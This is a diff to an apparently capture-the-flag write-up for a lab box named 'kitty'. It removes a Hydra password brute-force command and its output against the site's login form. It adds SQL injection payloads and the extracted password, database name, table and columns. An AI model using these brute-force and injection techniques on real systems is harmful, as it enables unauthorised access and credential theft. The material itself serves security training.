@@ -25,18 +25,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 # #3 user.txt
 
 ## HTTP (port 80)
-let's use hydra to try to bruteforce a HTTP account named kitty
-```
-┌──(parallels㉿kali)-[~]
-└─$ hydra -I -l kitty -P /usr/share/wordlists/rockyou.txt kitty.thm http-post-form "/index.php:username=kitty&password=^PASS^:Invalid username"
-Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+kitty' AND 1=1#
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-12 13:39:09
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
-[DATA] attacking http-post-form://kitty.thm:80/index.php:username=kitty&password=^PASS^:Invalid username
-[STATUS] 2500.00 tries/min, 2500 tries in 00:01h, 14341899 to do in 95:37h, 16 active
-[80][http-post-form] host: kitty.thm   login: kitty   password: sleepy
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-12 13:40:27
-```
+kitty' AND password LIKE '%'
 
+-> l0ng_liv3_kitty
+
+dbname : mywebsite
+
+table: siteusers
+fields: id,username,password,created_at
